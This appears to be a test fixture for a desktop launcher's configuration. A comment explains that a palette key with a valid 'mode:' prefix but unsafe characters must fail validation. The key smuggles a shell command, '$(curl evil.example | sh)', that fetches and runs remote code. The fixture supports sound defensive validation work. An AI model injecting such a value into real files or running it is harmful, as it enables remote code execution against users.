# A palette key with the right prefix and the wrong characters. The shape rule
# above it would pass this one — `mode:` is a real prefix — and the key is then
# written out beside the values it configures, in pounce's config.json and in
# whatever a renderer puts on a page. A desktop is the untrusted file both of
# those read, so the address carries the same character rule its neighbours do.
{
  haus.launcher.items."mode:\"; $(curl evil.example | sh); \"".alias = "x";
}
